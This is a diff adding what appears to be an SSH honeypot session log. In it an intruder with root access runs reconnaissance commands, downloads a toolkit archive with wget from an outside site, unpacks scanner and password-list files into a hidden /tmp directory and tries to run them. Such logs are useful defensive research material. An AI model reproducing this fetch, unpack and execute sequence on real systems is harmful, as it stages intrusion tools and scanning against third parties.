@@ -1,0 +1,118 @@
+[4hAWSWeb:~# w
+[4l 17:18:34 up 102 days, 19:22,  1 users, load averages: 0.09 0.05 0.05
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+root     pts/2    89.123.10.82      17:18    0.09   0.05   0.05 w
+[4hAWSWeb:~# ps x
+[4l  PID TTY          TIME CMD
+ 5478 pts/0    00:00:00 bash
+ 5679 pts/0    00:00:00 ps x
+[4hAWSWeb:~# uname -a
+[4lLinux AWSWeb 2.6.24-2-generic #1 SMP Thu Dec 20 17:36:12 GMT 2007 i686 GNU/Linux
+[4hAWSWeb:~# ls -al
+[4ldrwxr-xr-x 1 root root 4096 2013-05-07 17:18 .
+drwxr-xr-x 1 root root 4096 2013-05-07 17:18 ..
+drwxr-xr-x 1 root root 4096 2009-11-06 11:16 .debtags
+-rw------- 1 root root 5515 2009-11-20 09:08 .viminfo
+drwx------ 1 root root 4096 2009-11-06 11:13 .aptitude
+-rw-r--r-- 1 root root  140 2009-11-06 11:09 .profile
+-rw-r--r-- 1 root root  412 2009-11-06 11:09 .bashrc
+[4hAWSWeb:~# cd /t[1D[1Pg[1D[1Phome
+[4l[4hAWSWeb:/home# ;s =a;
+bash: s: command not found
+AWSWeb:/home# ls -al
+[4ldrwxr-xr-x 1 root root 4096 2013-05-07 17:18 .
+drwxr-xr-x 1 root root 4096 2013-05-07 17:18 ..
+drwxr-xr-x 1 1000 1000 4096 2009-11-06 11:22 richard
+[4hAWSWeb:/home# cd /tmp
+[4l[4hAWSWeb:/tmp# ls -al
+[4ldrwxr-xr-x 1 root root 4096 2013-05-07 17:18 .
+drwxr-xr-x 1 root root 4096 2013-05-07 17:18 ..
+drwxrwxrwx 1 root root 4096 2009-11-20 08:19 .ICE-unix
+drwxrwxrwx 1 root root 4096 2009-11-20 08:19 .X11-unix
+[4hAWSWeb:/tmp# wget http://mexicocityexplorer.com/tourscongreso/site/images/smtp.tar
+[4l--2013-05-07 17:19:04--  http://mexicocityexplorer.com/tourscongreso/site/images/smtp.tar
+Connecting to mexicocityexplorer.com:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 296960 (290K) [application/x-tar]
+Saving to: `smtp.tar
+
+ 0% [>                                      ] 2,525        22K/s  eta 12s100%[======================================>] 296,960      22K/s
+
+2013-05-07 17:19:05 (22 KB/s) - `smtp.tar' saved [296960/296960]
+[4hAWSWeb:/tmp# tar xvf sm[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Ptar xvf smtp.tar 
+[4l.smtp
+.smtp/vuln.asl
+.smtp/screen
+.smtp/ps
+.smtp/sesion.php
+.smtp/kas
+.smtp/196.206.pscan.25
+.smtp/pass_file
+.smtp/91.206.pscan.25
+[4hAWSWeb:/tmp# rm -rf smt[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Prm -rf smtp.tar 
+[4l[4hAWSWeb:/tmp# cd .smtp
+[4l[4hAWSWeb:/tmp/.smtp# ls -=al
+[4ldrwxr-xr-x 1 root root   4096 2013-05-07 17:19 .
+drwxr-xr-x 1 root root   4096 2013-05-07 17:19 ..
+-rwxr-xr-x 1 root root      0 2012-08-17 16:45 vuln.asl
+-rwxr-xr-x 1 root root 249980 2001-02-13 07:36 screen
+-rwxr-xr-x 1 root root  16071 2007-06-13 19:57 ps
+-rwxr-xr-x 1 root root   1388 2011-01-17 10:50 sesion.php
+-rwxr-xr-x 1 root root    490 2012-07-20 07:52 kas
+-rw-r--r-- 1 root root      0 2012-08-17 16:46 196.206.pscan.25
+-rwxr-xr-x 1 root root   1639 2012-07-20 14:57 pass_file
+-rw-r--r-- 1 root root  20480 2012-08-17 16:57 91.206.pscan.25
+[4hAWSWeb:/tmp/.smtp# hostname -s
+[4lAWSWeb
+[4hAWSWeb:/tmp/.smtp# [Khostname -s[1D[1Pf
+[4lAWSWeb
+[4hAWSWeb:/tmp/.smtp# cat /etc/hosts
+[4lcat: /etc/hosts: No such file or directory
+[4hAWSWeb:/tmp/.smtp# ifconfig
+[4leth0      Link encap:Ethernet  HWaddr 00:4c:a8:ab:32:f4  
+          inet addr:10.98.55.4  Bcast:10.98.55.255  Mask:255.255.255.0
+          inet6 addr: fe80::21f:c6ac:fd44:24d7/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:84045991 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:103776307 errors:0 dropped:0 overruns:0 carrier:2
+          collisions:0 txqueuelen:1000 
+          RX bytes:50588302699 (47.1 GiB)  TX bytes:97318807157 (90.6 GiB)
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:308297 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:308297 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:355278106 (338.8 MiB)  TX bytes:355278106 (338.8 MiB)
+[4hAWSWeb:/tmp/.smtp# ls -=al
+[4ldrwxr-xr-x 1 root root   4096 2013-05-07 17:19 .
+drwxr-xr-x 1 root root   4096 2013-05-07 17:19 ..
+-rwxr-xr-x 1 root root      0 2012-08-17 16:45 vuln.asl
+-rwxr-xr-x 1 root root 249980 2001-02-13 07:36 screen
+-rwxr-xr-x 1 root root  16071 2007-06-13 19:57 ps
+-rwxr-xr-x 1 root root   1388 2011-01-17 10:50 sesion.php
+-rwxr-xr-x 1 root root    490 2012-07-20 07:52 kas
+-rw-r--r-- 1 root root      0 2012-08-17 16:46 196.206.pscan.25
+-rwxr-xr-x 1 root root   1639 2012-07-20 14:57 pass_file
+-rw-r--r-- 1 root root  20480 2012-08-17 16:57 91.206.pscan.25
+[4hAWSWeb:/tmp/.smtp# chmod +x *
+[4l[4hAWSWeb:/tmp/.smtp# ./kas 54 1
+[4lShall we play a game? y
+A strange game. The only winning move is not to play.  How about a nice game of chess?
+[4hAWSWeb:/tmp/.smtp# [K./kas 54 1
+[4lShall we play a game? n
+A strange game. The only winning move is not to play.  How about a nice game of chess?
+[4hAWSWeb:/tmp/.smtp# perl
+bash: perl: command not found
+AWSWeb:/tmp/.smtp# PATH=.:$PATH [1D[1P;kas 58 1
+bash: kas: command not found
+AWSWeb:/tmp/.smtp# [KPATH=.:$PATH;kas 58 1[1D[1D[1D[1D[1D[1D[1D[1D./
+[4lShall we play a game? 
+A strange game. The only winning move is not to play.  How about a nice game of chess?
+[4hAWSWeb:/tmp/.smtp# ps x
+[4l  PID TTY          TIME CMD
+ 5478 pts/0    00:00:00 bash
+ 5679 pts/0    00:00:00 ps x
+[4hAWSWeb:/tmp/.smtp# 
